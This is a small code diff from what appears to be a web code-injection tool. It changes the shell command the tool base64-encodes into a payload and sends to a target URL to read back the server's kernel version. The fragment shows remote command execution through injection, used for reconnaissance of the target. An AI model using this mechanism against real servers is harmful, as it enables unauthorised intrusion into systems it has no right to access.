@@ -129,7 +129,7 @@ class codeinjector(baseClass):
                     self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
                     if (kernel == None):
                         self._log("Requesting kernel version...", self.LOG_DEBUG)
-                        uname_cmd = payload.replace("__PAYLOAD__", base64.b64encode("uname -r -o -s"))
+                        uname_cmd = payload.replace("__PAYLOAD__", base64.b64encode("uname -r -s"))
                         kernel = self.__doHaxRequest(url, mode, uname_cmd, suffix).strip()
                         self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                         domain.setAttribute("kernel", kernel)
